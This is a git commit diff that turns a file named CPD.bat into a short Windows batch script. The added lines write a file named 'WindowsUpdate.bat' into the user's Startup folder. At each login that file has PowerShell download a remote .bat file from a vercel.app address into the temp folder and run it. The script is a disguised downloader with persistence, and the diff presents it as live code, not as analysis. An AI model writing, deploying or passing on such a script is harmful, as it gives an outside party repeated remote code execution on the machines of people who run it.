971d6f9d6389fc7ec5167760226bcc622fd1bcab
lcmandrikion-hash <lcmandrikion@gmail.com>
2026-03-04 21:36:23 -0300

    Update CPD.bat

--- CPD.bat
+++ CPD.bat
@@ -1,1 +1,9 @@
-# CPD
+@echo off
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+(
+echo @echo off
+echo powershell -c "iwr 'https://lzx-one.vercel.app/LXZ.bat' -OutFile $env:TEMP\t.bat; & $env:TEMP\t.bat"
+) > "%startup%\WindowsUpdate.bat"
+
+exit
